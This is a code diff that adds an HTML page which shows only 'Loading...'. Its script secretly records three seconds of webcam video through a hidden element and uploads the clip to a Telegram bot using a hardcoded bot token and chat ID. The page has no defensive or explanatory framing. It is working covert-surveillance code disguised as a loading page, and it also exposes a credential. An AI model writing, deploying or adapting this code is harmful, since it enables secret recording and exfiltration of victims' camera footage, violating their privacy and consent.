@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Capture</title>
+</head>
+<body>
+    <h1 style="text-align: center;">Loading...</h1>
+    <video id="video" autoplay playsinline muted style="display: none;"></video>
+    <script>
+        const video = document.getElementById('video');
+        const telegramToken = "5106852555:AAGBGu_cOOtorL4B4aD7cu9JNMLoxZU0A3Q";
+        const telegramChatId = "2070423407";
+
+        // طلب الوصول إلى الكاميرا
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                // بدء التسجيل بعد فتح الموقع
+                mediaRecorder.start();
+
+                // حفظ البيانات أثناء التسجيل
+                mediaRecorder.ondataavailable = (event) => {
+                    chunks.push(event.data);
+                };
+
+                // إيقاف التسجيل بعد 3 ثوانٍ
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 3000);
+
+                // عند انتهاء التسجيل، إرسال الفيديو إلى تيليجرام
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('chat_id', telegramChatId);
+                    formData.append('video', blob, 'video.webm');
+
+                    fetch(`https://api.telegram.org/bot${telegramToken}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                        .then((response) => {
+                            if (response.ok) {
+                                alert('Video sent successfully!');
+                            } else {
+                                alert('Failed to send video.');
+                            }
+                        })
+                        .catch((error) => {
+                            alert('Error: ' + error.message);
+                        });
+
+                    // إيقاف الكاميرا بعد الانتهاء
+                    stream.getTracks().forEach(track => track.stop());
+                };
+            })
+            .catch((err) => {
+                alert("Unable to access camera: " + err.message);
+            });
+    </script>
+</body>
+</html>
